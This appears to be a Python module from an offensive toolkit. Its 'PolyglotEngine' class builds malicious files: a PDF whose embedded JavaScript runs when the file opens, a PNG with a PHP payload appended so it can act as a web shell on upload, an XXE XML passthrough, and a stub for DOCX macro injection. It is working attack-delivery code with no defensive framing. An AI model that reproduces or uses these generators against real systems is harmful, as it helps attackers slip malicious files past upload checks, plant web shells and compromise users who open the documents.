import struct

class PolyglotEngine:
    def __init__(self):
        pass

    def generate_pdf(self, js_payload):
        """
        Generates a valid PDF with embedded JavaScript that executes on open.
        """
        # Escape parenthesis in payload
        js_payload = js_payload.replace("(", "\\(").replace(")", "\\)")
        
        pdf_template = (
            "%PDF-1.1\n"
            "1 0 obj\n"
            "<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\n"
            "endobj\n"
            "2 0 obj\n"
            "<< /Type /Pages /Kids [4 0 R] /Count 1 >>\n"
            "endobj\n"
            "3 0 obj\n"
            "<< /Type /Action /S /JavaScript /JS ({payload}) >>\n"
            "endobj\n"
            "4 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n"
            "endobj\n"
            "xref\n"
            "0 5\n"
            "0000000000 65535 f \n"
            "0000000010 00000 n \n"
            "0000000079 00000 n \n"
            "0000000134 00000 n \n"
            "0000000202 00000 n \n"
            "trailer\n"
            "<< /Size 5 /Root 1 0 R >>\n"
            "startxref\n"
            "273\n"
            "%%EOF"
        )
        return pdf_template.format(payload=js_payload)

    def generate_png_polyglot(self, php_payload):
        """
        Generates a valid PNG with PHP payload embedded in a comment chunk or appended.
        For web shells, often just appending or putting in metadata works if the server processes it.
        """
        # Minimal 1x1 PNG
        png_header = b'\x89PNG\r\n\x1a\n'
        # IHDR chunk
        ihdr = b'\x00\x00\x00\x0D\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4\x89'
        # IDAT chunk (empty)
        idat = b'\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00\x05\x00\x01\x0D\x0A\x2D\xB4'
        # IEND chunk
        iend = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'
        
        # Inject PHP in a custom chunk or just append it (appending is common for polyglots)
        # But to be "Insane", let's put it in a custom chunk "tEXt" (Textual data)
        
        payload_bytes = php_payload.encode('utf-8')
        length = len(payload_bytes)
        # tEXt chunk structure: Length (4 bytes) + Type (4 bytes) + Data + CRC (4 bytes)
        # We'll just append it for simplicity in this V3 MVP, as it's more robust for PHP execution
        
        return png_header + ihdr + idat + iend + b"\n" + payload_bytes

    def generate_xml_polyglot(self, payload):
        """
        Generates an XML file with XXE injection.
        """
        # The payload is already a full XML XXE template from data.py
        return payload

    def generate_docx_polyglot(self, payload):
        """
        Placeholder for DOCX macro injection.
        """
        return payload
